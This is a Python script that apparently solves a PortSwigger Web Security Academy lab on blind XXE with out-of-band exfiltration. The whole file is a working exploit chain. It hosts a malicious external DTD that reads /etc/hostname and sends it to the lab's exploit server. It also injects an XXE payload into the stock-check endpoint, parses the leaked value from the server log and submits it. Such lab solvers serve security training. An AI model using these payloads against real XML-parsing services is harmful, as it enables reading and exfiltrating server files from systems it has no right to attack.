import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import re

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
# author: 0xyf
# w/o collaborator


class XXE5:
    def __init__(self):
        self.lab_id = "0aff00c10426ac6c81f6c0be002a00c1"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"
        self.collab_url = f"http://7w4ihhuy5h5455zbzwn2uz49z05wtqxem.oastify.com"
        self.get_exploit_srv_url()

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def get_submit_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        submit_path = soup.find("button", id="submitSolution").get("path")
        self.submit_url = f"{self.url}{submit_path}"

    def store_dtd(self):

        payload = f"""<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{self.exploit_srv_url}/?x=%file;'>">%eval;%exfiltrate;"""
        print(f"[+] payload 1: {payload}")
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def xxe(self):
        xxe_payload_1 = f"""<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{self.exploit_srv_url}/exploit"> %xxe; ]>"""
        xxe_payload_2 = "%xxe;"
        data = f"""<?xml version="1.0" encoding="UTF-8"?>{xxe_payload_1}<stockCheck><productId>{xxe_payload_2}</productId><storeId>1</storeId></stockCheck>"""
        print(f"[+] payload2: {data}")
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def get_file_contents(self):
        print("[+] sleeping 5")
        sleep(5)
        r = requests.get(
            f"{self.exploit_srv_url}/log",
            proxies=self.proxies,
            verify=False,
        )
        pattern = r"\/\?x=(.*) HTTP/1.1"
        match = re.findall(pattern, r.text)[0]
        print(match)
        self.file_content = match

    def submit_file_contents(self):
        self.get_submit_url()
        data = {"answer": self.file_content}
        print(f"[+] submitting key {self.file_content}")
        r = requests.post(
            self.submit_url,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.store_dtd()
        self.xxe()
        self.get_file_contents()
        self.submit_file_contents()
        self.check_solved()


def main():
    XXE5().solve()


if __name__ == "__main__":
    main()
